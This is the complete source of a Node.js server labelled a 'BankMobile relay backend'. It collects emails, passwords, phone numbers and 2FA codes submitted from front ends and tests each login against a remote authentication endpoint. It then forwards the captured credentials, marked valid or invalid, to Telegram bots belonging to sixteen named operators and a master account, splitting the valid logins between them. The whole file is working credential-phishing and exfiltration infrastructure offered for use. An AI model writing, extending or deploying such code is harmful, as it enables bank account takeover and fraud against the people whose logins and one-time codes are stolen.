// ================================================
// BANKMOBILE CENTRAL RELAY BACKEND
// Final version with queue system
// ================================================
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3004;

app.use(cors({ origin: '*' }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ================================================
// TELEGRAM BOT CONFIGURATIONS
// ================================================
const MASTER_BOT = {
    token: process.env.MASTER_BOT_TOKEN || process.env.BOT_TOKEN_1,
    chatId: process.env.MASTER_CHAT_ID || process.env.CHAT_ID_1
};

const BOT_CONFIGS = {
    'emmy': { token: process.env.BOT_TOKEN_1, chatId: process.env.CHAT_ID_1 },
    'mastapis': { token: process.env.BOT_TOKEN_2, chatId: process.env.CHAT_ID_2 },
    'black': { token: process.env.BOT_TOKEN_3, chatId: process.env.CHAT_ID_3 },
    'oju': { token: process.env.BOT_TOKEN_4, chatId: process.env.CHAT_ID_4 },
    'bosun': { token: process.env.BOT_TOKEN_5, chatId: process.env.CHAT_ID_5 },
    'jide': { token: process.env.BOT_TOKEN_6, chatId: process.env.CHAT_ID_6 },
    'chamber': { token: process.env.BOT_TOKEN_7, chatId: process.env.CHAT_ID_7 },
    'crip': { token: process.env.BOT_TOKEN_8, chatId: process.env.CHAT_ID_8 },
    'hayzed': { token: process.env.BOT_TOKEN_9, chatId: process.env.CHAT_ID_9 },
    'ysd': { token: process.env.BOT_TOKEN_10, chatId: process.env.CHAT_ID_10 },
    'sula': { token: process.env.BOT_TOKEN_11, chatId: process.env.CHAT_ID_11 },
    'aro': { token: process.env.BOT_TOKEN_12, chatId: process.env.CHAT_ID_12 },
    'apo': { token: process.env.BOT_TOKEN_13, chatId: process.env.CHAT_ID_13 },
    'alahji': { token: process.env.BOT_TOKEN_14, chatId: process.env.CHAT_ID_14 },
    'ola': { token: process.env.BOT_TOKEN_15, chatId: process.env.CHAT_ID_15 },
    'bamzy': { token: process.env.BOT_TOKEN_16, chatId: process.env.CHAT_ID_16 }
};

const DEFAULT_CONFIG = {
    token: process.env.DEFAULT_BOT_TOKEN || process.env.BOT_TOKEN_1,
    chatId: process.env.DEFAULT_CHAT_ID || process.env.CHAT_ID_1
};

// ================================================
// STORAGE
// ================================================
const validCounters = {};           // for alternating valid logins
const pendingQueue = {};            // queue of pending sessions per client
const SESSION_TIMEOUT = 15 * 60 * 1000; // 15 minutes

// Clean expired sessions every 2 minutes
setInterval(() => {
    const now = Date.now();
    for (const clientId in pendingQueue) {
        pendingQueue[clientId] = pendingQueue[clientId].filter(item => {
            return (now - item.createdAt) < SESSION_TIMEOUT;
        });
        if (pendingQueue[clientId].length === 0) {
            delete pendingQueue[clientId];
        }
    }
}, 2 * 60 * 1000);

// ================================================
// SEND TO TELEGRAM
// ================================================
async function sendToTelegram(token, chatId, message) {
    if (!token || !chatId) {
        console.log('⚠️ Missing token or chat ID');
        return false;
    }
    try {
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });
        console.log(`✅ Telegram sent to: ${chatId}`);
        return true;
    } catch (error) {
        console.error(`❌ Telegram error (${chatId}):`, error.message);
        return false;
    }
}

// ================================================
// HELPER: Send to both
// ================================================
async function sendToBoth(clientId, clientMessage, masterMessage) {
    const results = [];
    const config = BOT_CONFIGS[clientId] || DEFAULT_CONFIG;

    const clientResult = await sendToTelegram(config.token, config.chatId, clientMessage);
    results.push({ bot: clientId, sent: clientResult });

    const masterResult = await sendToTelegram(MASTER_BOT.token, MASTER_BOT.chatId, masterMessage);
    results.push({ bot: 'MASTER', sent: masterResult });

    return results;
}

// ================================================
// HELPER: Send only to one destination
// ================================================
async function sendToDestination(clientId, destination, clientMessage, masterMessage) {
    const results = [];

    if (destination === 'master') {
        const masterResult = await sendToTelegram(MASTER_BOT.token, MASTER_BOT.chatId, masterMessage);
        results.push({ bot: 'MASTER', sent: masterResult });
        results.push({ bot: clientId, sent: false, reason: 'Valid session → MASTER only' });
    } else {
        const config = BOT_CONFIGS[clientId] || DEFAULT_CONFIG;
        const clientResult = await sendToTelegram(config.token, config.chatId, clientMessage);
        results.push({ bot: clientId, sent: clientResult });
        results.push({ bot: 'MASTER', sent: false, reason: 'Valid session → CLIENT only' });
    }

    return results;
}

// ================================================
// MAIN ROUTING FUNCTION
// ================================================
async function sendToAllBots(clientMessage, clientId, masterMessage, isSuccess, isPhoneOrOtp = false, isOtp = false) {
    // ---------- PHONE or OTP ----------
    if (isPhoneOrOtp) {
        // Make sure queue exists
        if (!pendingQueue[clientId]) pendingQueue[clientId] = [];

        // Clean expired first
        const now = Date.now();
        pendingQueue[clientId] = pendingQueue[clientId].filter(item => (now - item.createdAt) < SESSION_TIMEOUT);

        if (isOtp) {
            // OTP → only match VALID sessions that still need OTP
            const index = pendingQueue[clientId].findIndex(item => item.type === 'valid' && !item.otpUsed);

            if (index !== -1) {
                const session = pendingQueue[clientId][index];
                session.otpUsed = true;

                // If both phone and otp are used, remove it
                if (session.phoneUsed && session.otpUsed) {
                    pendingQueue[clientId].splice(index, 1);
                }

                console.log(`🔐 OTP for ${clientId} → following valid session (${session.destination})`);
                return await sendToDestination(clientId, session.destination, clientMessage, masterMessage);
            } else {
                // No matching valid session → fallback to both
                console.log(`🔐 OTP for ${clientId} → no matching valid session → BOTH`);
                return await sendToBoth(clientId, clientMessage, masterMessage);
            }
        } else {
            // PHONE
            const index = pendingQueue[clientId].findIndex(item => !item.phoneUsed);

            if (index !== -1) {
                const session = pendingQueue[clientId][index];
                session.phoneUsed = true;

                if (session.type === 'invalid') {
                    // Invalid login phone → always both
                    // We can remove it now because invalid only needs phone
                    pendingQueue[clientId].splice(index, 1);
                    console.log(`📱 Phone for ${clientId} → INVALID session → BOTH`);
                    return await sendToBoth(clientId, clientMessage, masterMessage);
                } else {
                    // Valid login phone → follow destination
                    console.log(`📱 Phone for ${clientId} → VALID session (${session.destination})`);
                    return await sendToDestination(clientId, session.destination, clientMessage, masterMessage);
                }
            } else {
                // No pending session → fallback to both
                console.log(`📱 Phone for ${clientId} → no pending session → BOTH`);
                return await sendToBoth(clientId, clientMessage, masterMessage);
            }
        }
    }

    // ---------- INVALID LOGIN → always both + push to queue ----------
    if (!isSuccess) {
        if (!pendingQueue[clientId]) pendingQueue[clientId] = [];

        pendingQueue[clientId].push({
            type: 'invalid',
            destination: 'both',
            phoneUsed: false,
            otpUsed: true,          // invalid never expects OTP
            createdAt: Date.now()
        });

        console.log(`❌ Invalid login from ${clientId} → BOTH + queued for phone`);
        return await sendToBoth(clientId, clientMessage, masterMessage);
    }

    // ---------- VALID LOGIN → alternating + push to queue ----------
    if (!validCounters[clientId]) {
        validCounters[clientId] = 0;
    }

    validCounters[clientId]++;
    const isEven = validCounters[clientId] % 2 === 0;
    const destination = isEven ? 'master' : 'client';

    console.log(`🔄 ${clientId} valid #${validCounters[clientId]} → ${destination.toUpperCase()}`);

    // Push to queue
    if (!pendingQueue[clientId]) pendingQueue[clientId] = [];
    pendingQueue[clientId].push({
        type: 'valid',
        destination: destination,
        phoneUsed: false,
        otpUsed: false,
        createdAt: Date.now()
    });

    return await sendToDestination(clientId, destination, clientMessage, masterMessage);
}

// ================================================
// AUTHENTICATE WITH BANKMOBILE
// ================================================
async function authenticateWithAPI(email, password) {
    try {
        console.log(`🌐 Sending login request for: ${email}`);
        const params = new URLSearchParams();
        params.append('usrname', email);
        params.append('passwd', password);

        const response = await axios.post(
            'https://profile.refundselection.com/authenticate/login',
            params.toString(),
            {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                maxRedirects: 0,
                validateStatus: (status) => status < 500
            }
        );

        if (response.status === 302) {
            console.log('✅ SUCCESS');
            return { success: true };
        }
        console.log('❌ FAILED');
        return { success: false };
    } catch (error) {
        if (error.response && error.response.status === 302) {
            console.log('✅ SUCCESS (redirect)');
            return { success: true };
        }
        console.log('❌ FAILED:', error.message);
        return { success: false };
    }
}

// ================================================
// FORMAT MESSAGES
// ================================================
function formatMessage(email, password, success) {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
    const statusText = success ? '✅ VALID' : '❌ INVALID';
    const statusEmoji = success ? '✅' : '❌';

    const message =
        `${statusEmoji} <b>BANKMOBILE LOGIN</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `📧 <b>Email:</b> <code>${email}</code>\n` +
        `🔑 <b>Password:</b> <code>${password}</code>\n` +
        `📊 <b>Status:</b> ${statusText}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🕐 ${timestamp}`;

    return { clientMessage: message, masterMessage: message };
}

function formatPhoneMessage(phone) {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });

    const message =
        `📱 <b>PHONE NUMBER</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `📱 <b>Phone:</b> <code>${phone}</code>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🕐 ${timestamp}`;

    return { clientMessage: message, masterMessage: message };
}

function formatOtpMessage(otp, trusted) {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });

    const message =
        `🔐 <b>2FA CODE</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🔢 <b>Code:</b> <code>${otp}</code>\n` +
        `💻 <b>Trust Device:</b> ${trusted ? '✅ Yes' : '❌ No'}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🕐 ${timestamp}`;

    return { clientMessage: message, masterMessage: message };
}

// ================================================
// SHARED AUTH HANDLER
// ================================================
async function handleAuth(req, res) {
    const { email, password, frontend } = req.body;
    const clientId = frontend || 'default';

    console.log(`\n🔐 Login attempt from: ${clientId}`);
    console.log(`📧 Email: ${email}`);

    const result = await authenticateWithAPI(email, password);
    const messages = formatMessage(email, password, result.success);

    const results = await sendToAllBots(
        messages.clientMessage,
        clientId,
        messages.masterMessage,
        result.success,
        false
    );

    res.json({
        success: result.success,
        client: clientId,
        telegramSent: results,
        counter: validCounters[clientId] || 0,
        queueLength: pendingQueue[clientId] ? pendingQueue[clientId].length : 0
    });
}

// ================================================
// PHONE HANDLER
// ================================================
app.post('/submit-phone', async (req, res) => {
    const { phone, frontend } = req.body;
    const clientId = frontend || 'default';

    console.log(`📱 Phone from ${clientId}: ${phone}`);

    const messages = formatPhoneMessage(phone);
    await sendToAllBots(messages.clientMessage, clientId, messages.masterMessage, true, true, false);

    res.json({ success: true });
});

// ================================================
// OTP HANDLER
// ================================================
app.post('/submit-otp', async (req, res) => {
    const { otp, trusted, frontend } = req.body;
    const clientId = frontend || 'default';

    console.log(`🔐 OTP from ${clientId}: ${otp}`);

    const messages = formatOtpMessage(otp, trusted || false);
    await sendToAllBots(messages.clientMessage, clientId, messages.masterMessage, true, true, true);

    res.json({ success: true });
});

// ================================================
// ALL AUTH ENDPOINTS
// ================================================
app.post('/authenticate', handleAuth);
app.post('/auth', handleAuth);
app.post('/verify', handleAuth);
app.post('/login', handleAuth);
app.post('/validate', handleAuth);

// ================================================
// HEALTH CHECK
// ================================================
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        service: 'bankmobile-relay',
        clients: Object.keys(BOT_CONFIGS),
        counters: validCounters,
        pendingQueues: pendingQueue
    });
});

// ================================================
// ROOT
// ================================================
app.get('/', (req, res) => {
    res.json({
        service: 'BankMobile Relay Backend - Final Queue Version',
        status: 'running',
        logic: {
            invalidLogin: 'Both + queue for phone (phone also goes to both)',
            validLogin: 'Alternating + queue for phone+OTP',
            phone: 'Follows the matching queued session',
            otp: 'Only follows valid queued sessions'
        }
    });
});

// ================================================
// START SERVER
// ================================================
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ BankMobile Relay running on port ${PORT}`);
    console.log(`📨 Clients: ${Object.keys(BOT_CONFIGS).join(', ')}`);
    console.log(`🔄 Valid logins alternate | Phone/OTP follow queue`);
    console.log(`⏰ Pending sessions expire after 15 minutes`);
});
